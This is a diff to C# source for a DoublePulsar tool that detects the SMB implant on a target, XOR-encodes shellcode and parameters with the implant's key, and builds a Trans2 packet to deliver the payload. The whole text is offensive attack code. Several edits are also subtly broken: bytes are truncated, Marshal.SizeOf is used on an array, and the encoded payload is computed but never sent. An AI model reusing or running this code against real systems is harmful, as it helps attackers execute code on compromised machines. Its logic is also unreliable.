@@ -143,8 +143,7 @@ namespace DoublePulsar
             //SMBData added manually
         }
 
-
-        static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] parameters, byte[] encrypted_payload)
+        static public byte[] MakeTrans2Packet(ushort TID, ushort UID, byte[] parameters, byte[] encrypted_payload)
         {
             //figure this out here
             NETBIOS_HEADER NTHeader = new NETBIOS_HEADER
@@ -617,6 +616,25 @@ namespace DoublePulsar
             }
         }
 
+        public static byte[] XorDecryptFunc(Byte[] message, int key)
+        {
+            byte[] readedBytes;
+            byte[] xoredBytes;
+
+           readedBytes = new byte[message.Length];
+           xoredBytes = new byte[message.Length];
+           Array.Copy(message, readedBytes, message.Length);
+
+            for (int i = 0; i < readedBytes.Length; i++)
+          {
+              int xoredInt = readedBytes[i] ^ key;
+              xoredBytes[i] = (byte)xoredInt;
+          }
+
+            return xoredBytes;
+        }
+
+
         static void Main(string[] args)
         {
             string target = args[1];
@@ -677,10 +695,11 @@ namespace DoublePulsar
                 Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
 
                 //XorEncrypt the payload
-                XorEncrypt(shellcode, key);
+                //XorEncrypt(shellcode, (UInt32)key);
+                byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);
 
                 //Build DoublePulsar payload packet
-                byte[] doublepulsar_parameters = new byte[12];
+               // byte[] doublepulsar_parameters = new byte[12];
                 int size = Marshal.SizeOf(shellcode);
                 int chunk_size = 4096;
                 int offset = 0x00;
@@ -712,9 +731,17 @@ namespace DoublePulsar
                 */
 
                 //XorEncrypt the parameters
-                XorEncrypt(doublepulsar_parameters, key);
+                //XorEncrypt(doublepulsar_parameters, (UInt32)key);
 
-                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, doublepulsar_parameters, shellcode);
+                List<byte> doublepulsar_parameters = new List<byte>();
+                doublepulsar_parameters.Add((byte)size);
+                doublepulsar_parameters.Add((byte)chunk_size);
+                doublepulsar_parameters.Add((byte)offset);
+
+                byte[] byte_doublepulsar_parameters = doublepulsar_parameters.ToArray().ToArray();
+                byte[] xor_doublepulsar_parameters = XorDecryptFunc(byte_doublepulsar_parameters, (int)key);
+
+                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, xor_doublepulsar_parameters, shellcode);
 
                 try
                 {
